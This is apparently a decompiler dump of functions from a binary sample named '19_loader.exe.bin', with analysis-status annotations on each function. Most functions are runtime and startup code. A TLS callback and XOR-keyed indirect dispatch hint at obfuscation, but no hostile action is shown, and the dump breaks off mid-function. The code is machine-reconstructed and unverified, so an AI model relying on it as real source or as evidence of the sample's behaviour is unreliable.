/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12d38 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140012d38 rva=0x12d38 */

undefined8 FUN_140012d38(longlong *param_1,undefined8 *param_2,ulonglong param_3)

{
  longlong lVar1;
  
  FUN_1400125b9(param_1,param_3);
  lVar1 = param_1[2];
  if (param_3 != 0) {
    FUN_140021f30((undefined8 *)(*param_1 + lVar1),param_2,param_3);
  }
  param_1[2] = lVar1 + param_3;
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12db7 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140012db7 rva=0x12db7 */

void FUN_140012db7(undefined8 *param_1,longlong param_2,ulonglong param_3)

{
  byte bVar1;
  byte bVar2;
  char cVar3;
  ulonglong uVar4;
  undefined8 uVar5;
  undefined1 uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  undefined1 uVar9;
  ulonglong uVar10;
  
  uVar8 = 0;
  if (0xe < param_3) {
    uVar8 = param_3 - 0xf;
  }
  if (param_3 != 0) {
    uVar4 = 0;
    do {
      bVar1 = *(byte *)(param_2 + uVar4);
      uVar7 = (ulonglong)bVar1;
      if ((char)bVar1 < '\0') {
        cVar3 = (&DAT_140088e9a)[uVar7];
        uVar9 = 1;
        if (cVar3 == '\x02') {
          uVar10 = uVar4 + 1;
          if (uVar10 < param_3) {
            uVar6 = 1;
            if (*(char *)(param_2 + uVar10) < -0x40) {
LAB_140012e43:
              uVar4 = uVar10 + 1;
              goto LAB_140012e49;
            }
          }
          else {
LAB_140012f27:
            uVar6 = (undefined1)uVar7;
            uVar9 = 0;
          }
        }
        else {
          if (cVar3 == '\x04') {
            if (param_3 <= uVar4 + 1) goto LAB_140012f27;
            cVar3 = *(char *)(param_2 + uVar4 + 1);
            if (uVar7 == 0xf0) {
              if ((byte)(cVar3 + 0x70U) < 0x30) goto LAB_140012f3a;
            }
            else if (bVar1 == 0xf4) {
              if (cVar3 < -0x70) {
LAB_140012f3a:
                uVar7 = uVar4 + 2;
                if (uVar7 < param_3) {
                  if (-0x41 < *(char *)(param_2 + uVar7)) goto LAB_140012f5e;
                  uVar10 = uVar4 + 3;
                  if (uVar10 < param_3) {
                    if (*(char *)(param_2 + uVar10) < -0x40) goto LAB_140012e43;
                    uVar6 = 3;
                    goto LAB_140012f64;
                  }
                }
                goto LAB_140012f27;
              }
            }
            else if (((byte)(bVar1 + 0xf) < 3) && (cVar3 < -0x40)) goto LAB_140012f3a;
          }
          else if (cVar3 == '\x03') {
            if (param_3 <= uVar4 + 1) goto LAB_140012f27;
            bVar2 = *(byte *)(param_2 + uVar4 + 1);
            if (uVar7 == 0xe0) {
              if ((bVar2 & 0xe0) == 0xa0) goto LAB_140012e2b;
            }
            else if (bVar1 == 0xed) {
              if ((char)bVar2 < -0x60) {
LAB_140012e2b:
                uVar10 = uVar4 + 2;
                if (param_3 <= uVar10) goto LAB_140012f27;
                if (*(char *)(param_2 + uVar10) < -0x40) goto LAB_140012e43;
LAB_140012f5e:
                uVar6 = 2;
                goto LAB_140012f64;
              }
            }
            else if ((((byte)(bVar1 + 0x1f) < 0xc) ||
                     (uVar7 = (ulonglong)(bVar1 & 0xfe), (bVar1 & 0xfe) == 0xee)) &&
                    ((char)bVar2 < -0x40)) goto LAB_140012e2b;
          }
          uVar6 = 1;
        }
LAB_140012f64:
        param_1[1] = uVar4;
        *(undefined1 *)(param_1 + 2) = uVar9;
        *(undefined1 *)((longlong)param_1 + 0x11) = uVar6;
        uVar5 = 1;
        goto LAB_140012f74;
      }
      if ((-(int)uVar4 - (int)param_2 & 7U) == 0) {
        while ((uVar4 < uVar8 &&
               (((*(ulonglong *)(param_2 + 8 + uVar4) | *(ulonglong *)(param_2 + uVar4)) &
                0x8080808080808080) == 0))) {
          uVar4 = uVar4 + 0x10;
        }
        if (uVar4 < param_3) {
          while (-1 < *(char *)(param_2 + uVar4)) {
            uVar4 = uVar4 + 1;
            if (param_3 == uVar4) goto LAB_140012e4e;
          }
        }
      }
      else {
        uVar4 = uVar4 + 1;
      }
LAB_140012e49:
    } while (uVar4 < param_3);
  }
LAB_140012e4e:
  param_1[1] = param_2;
  param_1[2] = param_3;
  uVar5 = 0;
LAB_140012f74:
  *param_1 = uVar5;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12f7e | no_partial_markers_not_a_CFG_proof ===== */
/* address=140012f7e rva=0x12f7e */

void FUN_140012f7e(longlong param_1,longlong param_2,undefined4 param_3,undefined8 param_4,
                  undefined8 param_5)

{
  undefined8 *puVar1;
  ushort uVar2;
  longlong lVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  
  uVar2 = *(ushort *)(param_2 + 0x98);
  uVar5 = (ulonglong)uVar2;
  puVar1 = (undefined8 *)(param_2 + param_1 * 4);
  uVar4 = param_1 + 1;
  if (uVar5 < uVar4) {
    *(undefined4 *)puVar1 = param_3;
  }
  else {
    FUN_140021f30((undefined8 *)(param_2 + uVar4 * 4),puVar1,(uVar5 - param_1) * 4);
    *(undefined4 *)(param_2 + param_1 * 4) = param_3;
    FUN_140021f30((undefined8 *)(param_2 + uVar4 * 8 + 0x30),
                  (undefined8 *)(param_2 + param_1 * 8 + 0x30),(uVar5 - param_1) * 8);
  }
  *(undefined8 *)(param_2 + 0x30 + param_1 * 8) = param_4;
  if (param_1 + 2U < uVar5 + 2) {
    FUN_140021f30((undefined8 *)(param_2 + 0xa0 + (param_1 + 2U) * 8),
                  (undefined8 *)(param_2 + 0xa0 + uVar4 * 8),(uVar5 - param_1) * 8);
  }
  *(undefined8 *)(param_2 + 0xa8 + param_1 * 8) = param_5;
  *(ushort *)(param_2 + 0x98) = uVar2 + 1;
  if (uVar4 < uVar5 + 2) {
    uVar4 = param_1 - 1;
    do {
      lVar3 = *(longlong *)(param_2 + 0xb0 + uVar4 * 8);
      *(longlong *)(lVar3 + 0x90) = param_2;
      *(short *)(lVar3 + 0x88) = (short)uVar4 + 2;
      uVar4 = uVar4 + 1;
    } while (uVar5 != uVar4);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13080 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013080 rva=0x13080 */

void tls_callback_140013080(undefined8 param_1,int param_2)

{
  if ((param_2 == 1) || (param_2 == 2)) {
    FUN_140011d10();
    return;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1309d | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001309d rva=0x1309d */

uint FUN_14001309d(longlong param_1,ushort param_2,char param_3)

{
  undefined8 uVar1;
  longlong lVar2;
  char cVar3;
  short sVar4;
  uint uVar5;
  
  switch(*(uint *)(param_1 + 4) >> 0x1d & 3) {
  case 0:
    param_2 = 0;
    break;
  case 2:
    param_2 = param_2 >> 1;
    break;
  case 3:
    if (param_3 == '\0') {
      param_2 = 0;
    }
  }
  uVar5 = *(uint *)(param_1 + 4) & 0x1fffff;
  uVar1 = *(undefined8 *)(param_1 + 0x10);
  lVar2 = *(longlong *)(param_1 + 0x18);
  sVar4 = param_2 + 1;
  do {
    sVar4 = sVar4 + -1;
    if (sVar4 == 0) {
      return uVar5;
    }
    cVar3 = (**(code **)(lVar2 + 0x20))(uVar1,uVar5);
  } while (cVar3 == '\0');
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13125 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_140013125(void)

{
  undefined8 uVar1;
  code *pcVar2;
  undefined4 *puVar3;
  LPVOID local_58;
  longlong lStack_50;
  LPVOID *ppvStack_40;
  undefined8 **ppuStack_38;
  undefined8 *puStack_30;
  ulonglong uStack_28;
  undefined8 uStack_20;
  
  uVar1 = *(undefined8 *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0xd8);
  puStack_30 = FUN_14000fc7a(0,0x3b);
  puVar3 = &UNK_14008b198;
  if (puStack_30 == (undefined8 *)0x0) {
    puVar3 = &UNK_14008b19c;
  }
                    /* WARNING: Switch is manually overridden */
  switch(*puVar3) {
  case 0:
    *(undefined8 *)((longlong)puStack_30 + 0x2b) = 0x20737361702d6565;
    *(undefined8 *)((longlong)puStack_30 + 0x33) = 0x676e69646f636e65;
    puStack_30[4] = 0x207373617020646e;
    puStack_30[5] = 0x61702d6565726874;
    puStack_30[2] = 0x746e6f6365746172;
    puStack_30[3] = 0x6f636573206c6f72;
    *puStack_30 = 0x6c616e7265746e69;
    puStack_30[1] = 0x20737361702d3220;
    ppuStack_38 = &puStack_30;
    uStack_28 = (ulonglong)((uint)uVar1 ^ 0xa125897c);
    uStack_20 = 0x3b;
    ppvStack_40 = (LPVOID *)&LAB_140002152;
    FUN_1400024d6(&local_58,(ulonglong)&ppvStack_40);
    DAT_1400e06d8 = 0;
    ppvStack_40 = &local_58;
    FUN_140001280(local_58,lStack_50,1,1);
    FUN_140001280(puStack_30,uStack_28,1,1);
    return;
  case 0xb0:
                    /* WARNING: Does not return */
    pcVar2 = (code *)invalidInstructionException();
    (*pcVar2)();
  }
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1322d | partial_markers_remain ===== */
/* address=14001322d rva=0x1322d */

ulonglong FUN_14001322d(byte *param_1,byte *param_2,ushort *param_3)

{
  ulonglong *puVar1;
  byte bVar2;
  undefined8 uVar3;
  longlong lVar4;
  char cVar5;
  uint uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ushort uVar9;
  byte *pbVar10;
  ushort uVar11;
  ushort uVar12;
  byte *pbVar13;
  longlong lVar14;
  longlong lVar15;
  ulonglong uVar16;
  byte *pbVar17;
  ulonglong unaff_R12;
  undefined7 uVar19;
  ulonglong uVar18;
  uint uVar20;
  
  if ((*(uint *)(param_3 + 2) & 0x18000000) != 0) {
    if ((*(uint *)(param_3 + 2) >> 0x1c & 1) == 0) {
      if (param_2 < (byte *)0x20) {
        uVar7 = 0;
        if (param_2 != (byte *)0x0) {
          pbVar10 = (byte *)0x0;
          do {
            uVar7 = uVar7 + (-0x41 < (char)param_1[(longlong)pbVar10]);
            pbVar10 = pbVar10 + 1;
          } while (pbVar10 != param_2);
        }
      }
      else {
        pbVar10 = (byte *)((ulonglong)(param_1 + 7) & 0xfffffffffffffff8);
        uVar8 = (longlong)param_2 - ((longlong)pbVar10 - (longlong)param_1);
        uVar7 = (ulonglong)((uint)uVar8 & 7);
        lVar14 = 0;
        if (pbVar10 != param_1) {
          lVar15 = 0;
          do {
            lVar14 = lVar14 + (ulonglong)(-0x41 < (char)param_1[lVar15]);
            lVar15 = lVar15 + 1;
          } while ((longlong)pbVar10 - (longlong)param_1 != lVar15);
        }
        if (uVar7 == 0) {
          lVar15 = 0;
        }
        else {
          uVar16 = 0;
          lVar15 = 0;
          do {
            lVar4 = uVar16 + (uVar8 & 0x7ffffffffffffff8);
            uVar16 = uVar16 + 1;
            lVar15 = lVar15 + (ulonglong)(-0x41 < (char)pbVar10[lVar4]);
          } while (uVar7 != uVar16);
        }
        uVar7 = lVar15 + lVar14;
        uVar8 = uVar8 >> 3;
        do {
          pbVar17 = pbVar10;
          if (uVar8 == 0) goto LAB_14001335c;
          uVar16 = 0xc0;
          if (uVar8 < 0xc0) {
            uVar16 = uVar8;
          }
          uVar6 = (uint)uVar16;
          uVar20 = uVar6 * 8 & 0x7e0;
          if (uVar20 == 0) {
            uVar18 = 0;
          }
          else {
            uVar18 = 0;
            pbVar10 = pbVar17;
            do {
              lVar14 = 0;
              do {
                puVar1 = (ulonglong *)(pbVar10 + lVar14);
                lVar14 = lVar14 + 8;
                uVar18 = uVar18 + ((*puVar1 >> 6 | ~*puVar1 >> 7) & 0x101010101010101);
              } while (lVar14 != 0x20);
              pbVar10 = pbVar10 + 0x20;
            } while (pbVar17 + uVar20 != pbVar10);
          }
          uVar8 = uVar8 - uVar16;
          unaff_R12 = ((uVar18 >> 8 & 0xff00ff00ff00ff) + (uVar18 & 0xff00ff00ff00ff)) *
                      0x1000100010001 >> 0x30;
          uVar7 = uVar7 + unaff_R12;
          pbVar10 = pbVar17 + uVar6 * 8;
        } while ((uVar16 & 3) == 0);
        uVar8 = 0;
        uVar16 = 0;
        do {
          uVar8 = uVar8 + ((*(ulonglong *)(pbVar17 + uVar16 + (ulonglong)(uVar6 & 0xfc) * 8) >> 6 |
                           ~*(ulonglong *)(pbVar17 + uVar16 + (ulonglong)(uVar6 & 0xfc) * 8) >> 7) &
                          0x101010101010101);
          uVar16 = uVar16 + 8;
        } while (uVar16 != (uVar6 & 3) << 3);
        uVar7 = uVar7 + (((uVar8 >> 8 & 0xff00ff00ff00ff) + (uVar8 & 0xff00ff00ff00ff)) *
                         0x1000100010001 >> 0x30);
      }
    }
    else {
      uVar7 = (ulonglong)param_3[4];
      pbVar10 = param_2 + (longlong)param_1;
      param_2 = (byte *)0x0;
      if (uVar7 != 0) {
        uVar8 = uVar7;
        pbVar17 = param_1;
        do {
          if (pbVar10 == pbVar17) goto LAB_1400132a0;
          bVar2 = *pbVar17;
          if ((char)bVar2 < '\0') {
            if (bVar2 < 0xe0) {
              pbVar13 = pbVar17 + 2;
            }
            else {
              pbVar13 = pbVar17 + (4 - (ulonglong)(bVar2 < 0xf0));
            }
          }
          else {
            pbVar13 = pbVar17 + 1;
          }
          param_2 = pbVar13 + ((longlong)param_2 - (longlong)pbVar17);
          uVar8 = uVar8 - 1;
          pbVar17 = pbVar13;
        } while (uVar8 != 0);
      }
      uVar8 = 0;
LAB_1400132a0:
      uVar7 = uVar7 - uVar8;
    }
LAB_14001335c:
    if (uVar7 < *param_3) {
      uVar9 = *param_3 - (short)uVar7;
      uVar6 = FUN_14001309d((longlong)param_3,uVar9,'\0');
      uVar19 = (undefined7)(unaff_R12 >> 8);
      uVar8 = CONCAT71(uVar19,1);
      if (uVar6 != 0xffffffff) {
        uVar3 = *(undefined8 *)(param_3 + 8);
        lVar14 = *(longlong *)(param_3 + 0xc);
        cVar5 = (**(code **)(lVar14 + 0x18))(uVar3,param_1,param_2);
        if (cVar5 == '\0') {
          uVar11 = 0xffff;
          do {
            uVar12 = uVar9;
            if ((ushort)(uVar11 - uVar9) == -1) break;
            cVar5 = (**(code **)(lVar14 + 0x20))(uVar3,uVar6);
            uVar12 = uVar11 + 1;
            uVar11 = uVar12;
          } while (cVar5 == '\0');
          uVar8 = CONCAT71(uVar19,uVar12 < uVar9);
        }
      }
      return uVar8 & 0xffffffff;
    }
  }
                    /* WARNING: Could not recover jumptable at 0x000140013425. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar8 = (**(code **)(*(longlong *)(param_3 + 0xc) + 0x18))
                    (*(undefined8 *)(param_3 + 8),param_1,param_2);
  return uVar8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13540 | partial_markers_remain ===== */
/* address=140013540 rva=0x13540 */

void FUN_140013540(void)

{
  longlong lVar1;
  ulonglong uVar2;
  int *piVar3;
  
  lVar1 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
  piVar3 = &DAT_14008a7cc;
  uVar2 = (ulonglong)((uint)DAT_1400defd8 ^ 0xa5ca57fd);
  if (uVar2 != *(ulonglong *)(lVar1 + 0x38)) {
    piVar3 = &DAT_14008a7d8;
  }
                    /* WARNING: Could not recover jumptable at 0x0001400135b9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(&DAT_14001362a + *piVar3))(uVar2,lVar1 + 0x38);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x136d4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400136d4 rva=0x136d4 */

ulonglong FUN_1400136d4(uint param_1)

{
  longlong lVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  
  uVar6 = 0xc;
  lVar1 = 0;
  do {
    lVar2 = lVar1 + (uVar6 >> 1);
    if (param_1 < ((&DAT_1400888ec)[lVar2] & 0x1fffff)) {
      lVar2 = lVar1;
    }
    uVar6 = uVar6 - (uVar6 >> 1);
    lVar1 = lVar2;
  } while (1 < uVar6);
  uVar5 = (ulonglong)((&DAT_1400888ec)[lVar2] * 0x800 == param_1 * 0x800) + lVar2 +
          (ulonglong)((uint)((&DAT_1400888ec)[lVar2] * 0x800) < param_1 * 0x800);
  uVar7 = 0x23;
  uVar6 = (ulonglong)((uint)(&DAT_1400888ec)[uVar5] >> 0x15);
  if ((uVar5 < 0xb) &&
     (uVar7 = (ulonglong)(*(uint *)(&DAT_1400888f0 + uVar5 * 4) >> 0x15), uVar5 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = *(uint *)(&DAT_1400888e8 + uVar5 * 4) & 0x1fffff;
  }
  if (~uVar6 + uVar7 != 0) {
    uVar4 = 0;
    do {
      uVar4 = (byte)(&DAT_14008a0ff)[uVar6] + uVar4;
      if (param_1 - uVar3 < uVar4) break;
      uVar6 = uVar6 + 1;
    } while (uVar7 - 1 != uVar6);
  }
  return uVar6 & 0xffffffffffffff01;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13790 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013790 rva=0x13790 */

undefined8
FUN_140013790(undefined8 *param_1,ulonglong param_2,ulonglong param_3,LPVOID param_4,
             ulonglong param_5)

{
  ulonglong uVar1;
  ulonglong uVar2;
  int local_30 [2];
  undefined8 local_28;
  
  if (CARRY8(param_2,param_3)) {
    local_28 = 0;
  }
  else {
    uVar1 = param_1[1] * 2;
    uVar2 = param_2 + param_3;
    if (param_2 + param_3 < uVar1) {
      uVar2 = uVar1;
    }
    uVar1 = (ulonglong)(param_5 == 1) * 4 + 4;
    if (uVar2 < uVar1) {
      uVar2 = uVar1;
    }
    FUN_140022cf8((ulonglong *)local_30,(LPVOID)*param_1,param_1[1],uVar2,param_4,param_5);
    if (local_30[0] != 1) {
      *param_1 = local_28;
      param_1[1] = uVar2;
      local_28 = 0xffffffffffffffff;
    }
  }
  return local_28;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1381b | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001381b rva=0x1381b */

undefined1 * FUN_14001381b(undefined8 *param_1,ulonglong param_2)

{
  code *pcVar1;
  undefined8 *puVar2;
  undefined1 *puVar3;
  int local_38 [2];
  undefined8 *local_30;
  undefined8 local_28;
  
  FUN_140002164((undefined8 *)local_38,param_2,0,1,1);
  if (local_38[0] != 1) {
    FUN_140021f30(local_30,param_1,param_2);
    puVar2 = FUN_14000fc7a(0,0x18);
    if (puVar2 != (undefined8 *)0x0) {
      *puVar2 = local_30;
      puVar2[1] = local_28;
      puVar2[2] = param_2;
      puVar3 = FUN_14000fc7a(0,0x28);
      if (puVar3 != (undefined1 *)0x0) {
        *puVar3 = 0x14;
        *(code **)(puVar3 + 8) = FUN_140012055;
        *(undefined8 **)(puVar3 + 0x10) = puVar2;
        *(undefined ***)(puVar3 + 0x18) = &PTR_LAB_1400886f8;
        *(code **)(puVar3 + 0x20) = FUN_140012082;
        return puVar3 + 1;
      }
    }
  }
                    /* WARNING: Does not return */
  pcVar1 = (code *)invalidInstructionException();
  (*pcVar1)();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13c00 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013c00 rva=0x13c00 */

void FUN_140013c00(void)

{
  undefined1 *in_RAX;
  undefined1 *puVar1;
  undefined1 *puVar2;
  undefined1 local_res8 [32];
  
  puVar1 = local_res8 + -(longlong)in_RAX;
  if (local_res8 < in_RAX) {
    puVar1 = (undefined1 *)0x0;
  }
  if (puVar1 < StackLimit) {
    puVar2 = StackLimit;
    do {
      puVar2 = puVar2 + -0x1000;
      *puVar2 = 0;
    } while ((undefined1 *)((ulonglong)puVar1 & 0xfffffffffffff000) != puVar2);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13c50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013c50 rva=0x13c50 */

void FUN_140013c50(void)

{
  code *pcVar1;
  bool bVar2;
  char cVar3;
  int iVar4;
  undefined8 uVar5;
  undefined4 *puVar6;
  undefined7 extraout_var;
  
  FUN_140015ed4(1);
  uVar5 = FUN_140014230();
  FUN_140015edc((int)uVar5);
  uVar5 = FUN_140014210();
  puVar6 = (undefined4 *)FUN_140014d40();
  *puVar6 = (int)uVar5;
  uVar5 = FUN_1400140b0(1);
  if ((char)uVar5 != '\0') {
    FUN_1400143e0();
    FUN_140013ee0(0x140014430);
    uVar5 = FUN_140014220();
    iVar4 = FUN_14001518c((int)uVar5);
    if (iVar4 == 0) {
      FUN_140014240();
      bVar2 = FUN_1400142b0();
      if ((int)CONCAT71(extraout_var,bVar2) != 0) {
        FUN_140014d50(0x140014210);
      }
      _guard_check_icall();
      _guard_check_icall();
      uVar5 = FUN_140014210();
      FUN_140015080((int)uVar5);
      cVar3 = FUN_140014250();
      if (cVar3 != '\0') {
        thunk_FUN_140015a08();
      }
      FUN_140014210();
      uVar5 = thunk_FUN_140014210();
      if ((int)uVar5 == 0) {
        return;
      }
    }
  }
  FUN_140014370(7);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13d10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013d10 rva=0x13d10 */

undefined8 FUN_140013d10(void)

{
  FUN_140014270();
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13d20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013d20 rva=0x13d20 */

void FUN_140013d20(void)

{
  undefined8 uVar1;
  
  FUN_140014360();
  uVar1 = FUN_140014210();
  FUN_140015f30((uint)uVar1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13d40 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013d40 rva=0x13d40 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

uint FUN_140013d40(void)

{
  bool bVar1;
  bool bVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  longlong *plVar5;
  ulonglong uVar6;
  ulonglong *puVar7;
  uint unaff_EBX;
  undefined8 in_R9;
  undefined1 uVar8;
  
  uVar3 = FUN_140014040(1);
  if ((char)uVar3 == '\0') {
    FUN_140014370(7);
  }
  else {
    bVar1 = false;
    uVar8 = 0;
    uVar3 = FUN_140013fc0();
    unaff_EBX = (uint)uVar3 & 0xff;
    if (DAT_1400e0710 != 1) {
      if (DAT_1400e0710 == 0) {
        DAT_1400e0710 = 1;
        uVar4 = FUN_140015d24((undefined8 *)&DAT_1400930d0,(undefined8 *)&DAT_140093108);
        if ((int)uVar4 != 0) {
          return 0xff;
        }
        FUN_140015cec((undefined8 *)&DAT_1400930b8,(undefined8 *)&DAT_1400930c8);
        DAT_1400e0710 = 2;
      }
      else {
        bVar1 = true;
        uVar8 = 1;
      }
      FUN_140014010((char)uVar3);
      plVar5 = (longlong *)FUN_1400142c0();
      if ((*plVar5 != 0) && (uVar6 = FUN_140013f20((longlong)plVar5), (char)uVar6 != '\0')) {
        (*(code *)*plVar5)(0,2,0,in_R9,uVar8);
      }
      puVar7 = (ulonglong *)FUN_1400142d0();
      if ((*puVar7 != 0) && (uVar6 = FUN_140013f20((longlong)puVar7), (char)uVar6 != '\0')) {
        FUN_140014dc0(*puVar7);
      }
      FUN_140015938();
      FUN_140014d10();
      FUN_140014d08();
      unaff_EBX = FUN_140013540();
      bVar2 = FUN_1400142f0();
      if (bVar2) {
        if (!bVar1) {
          FUN_140014da0();
        }
        FUN_140014080('\x01','\0');
        return unaff_EBX;
      }
      goto LAB_140013eaf;
    }
  }
  FUN_140014370(7);
LAB_140013eaf:
  FUN_140014d88(unaff_EBX);
                    /* WARNING: Subroutine does not return */
  FUN_140014d94(unaff_EBX);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13ec0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013ec0 rva=0x13ec0 */

void entry(void)

{
  FUN_140014150();
  FUN_140013d40();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13ee0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013ee0 rva=0x13ee0 */

int FUN_140013ee0(longlong param_1)

{
  int iVar1;
  longlong lVar2;
  
  if (DAT_1400e0728 == -1) {
    iVar1 = FUN_1400155e0(param_1);
  }
  else {
    iVar1 = FUN_140015554(&DAT_1400e0728,param_1);
  }
  lVar2 = 0;
  if (iVar1 == 0) {
    lVar2 = param_1;
  }
  return (lVar2 != 0) - 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13f20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013f20 rva=0x13f20 */

/* WARNING: Removing unreachable block (ram,0x000140013fa6) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

ulonglong FUN_140013f20(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  
  pIVar1 = &IMAGE_SECTION_HEADER_140000180;
  while( true ) {
    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000298) {
      return 0x140000200;
    }
    if (((ulonglong)(uint)pIVar1->VirtualAddress <= param_1 - 0x140000000U) &&
       (param_1 - 0x140000000U <
        (ulonglong)((pIVar1->Misc).PhysicalAddress + pIVar1->VirtualAddress))) break;
    pIVar1 = pIVar1 + 1;
  }
  if ((int)pIVar1->Characteristics < 0) {
    return (ulonglong)pIVar1 & 0xffffffffffffff00;
  }
  return CONCAT71((int7)((ulonglong)pIVar1 >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x13fc0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140013fc0 rva=0x13fc0 */

ulonglong FUN_140013fc0(void)

{
  bool bVar1;
  undefined7 extraout_var;
  void *pvVar2;
  
  bVar1 = FUN_140014730();
  pvVar2 = (void *)CONCAT71(extraout_var,bVar1);
  if ((int)pvVar2 != 0) {
    pvVar2 = (void *)0x0;
    LOCK();
    bVar1 = DAT_1400e0718 == (void *)0x0;
    if (bVar1) {
      DAT_1400e0718 = StackBase;
    }
    else {
      pvVar2 = DAT_1400e0718;
    }
    UNLOCK();
    while (!bVar1) {
      if (StackBase == pvVar2) {
        return CONCAT71((int7)((ulonglong)pvVar2 >> 8),1);
      }
      pvVar2 = (void *)0x0;
      LOCK();
      bVar1 = DAT_1400e0718 == (void *)0x0;
      if (bVar1) {
        DAT_1400e0718 = StackBase;
      }
      else {
        pvVar2 = DAT_1400e0718;
      }
      UNLOCK();
    }
  }
  return (ulonglong)pvVar2 & 0xffffffffffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14010 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014010 rva=0x14010 */

undefined8 FUN_140014010(char param_1)

{
  undefined8 uVar1;
  bool bVar2;
  undefined7 extraout_var;
  undefined8 uVar3;
  
  bVar2 = FUN_140014730();
  uVar1 = DAT_1400e0718;
  uVar3 = CONCAT71(extraout_var,bVar2);
  if (((int)uVar3 != 0) && (param_1 == '\0')) {
    LOCK();
    DAT_1400e0718 = 0;
    UNLOCK();
    uVar3 = uVar1;
  }
  return uVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14040 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014040 rva=0x14040 */

ulonglong FUN_140014040(int param_1)

{
  undefined4 uVar1;
  undefined4 extraout_var_00;
  undefined8 uVar2;
  uint7 extraout_var;
  ulonglong uVar3;
  
  if (param_1 == 0) {
    DAT_1400e0720 = 1;
  }
  FUN_140014480();
  uVar1 = FUN_140014b40();
  uVar3 = CONCAT44(extraout_var_00,uVar1);
  if ((char)uVar1 != '\0') {
    uVar2 = FUN_140014cbc();
    if ((char)uVar2 != '\0') {
      return CONCAT71((int7)((ulonglong)uVar2 >> 8),1);
    }
    FUN_140014b70('\0');
    uVar3 = (ulonglong)extraout_var << 8;
  }
  return uVar3 & 0xffffffffffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14080 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014080 rva=0x14080 */

undefined8 FUN_140014080(char param_1,char param_2)

{
  longlong in_RAX;
  uint7 extraout_var;
  
  if ((DAT_1400e0720 == '\0') || (param_2 == '\0')) {
    FUN_140014cd0(param_1);
    FUN_140014b70(param_1);
    in_RAX = (ulonglong)extraout_var << 8;
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x140b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400140b0 rva=0x140b0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_1400140b0(uint param_1)

{
  code *pcVar1;
  bool bVar2;
  ulonglong in_RAX;
  undefined7 extraout_var;
  undefined8 uVar3;
  
  if (DAT_1400e0721 == '\0') {
    if (1 < param_1) {
      FUN_140014370(5);
      pcVar1 = (code *)swi(3);
      uVar3 = (*pcVar1)();
      return uVar3;
    }
    bVar2 = FUN_140014730();
    in_RAX = CONCAT71(extraout_var,bVar2);
    if (((int)in_RAX == 0) || (param_1 != 0)) {
      DAT_1400e0728 = 0xffffffffffffffff;
      uRam00000001400e0730 = 0xffffffffffffffff;
      _DAT_1400e0738 = 0xffffffffffffffff;
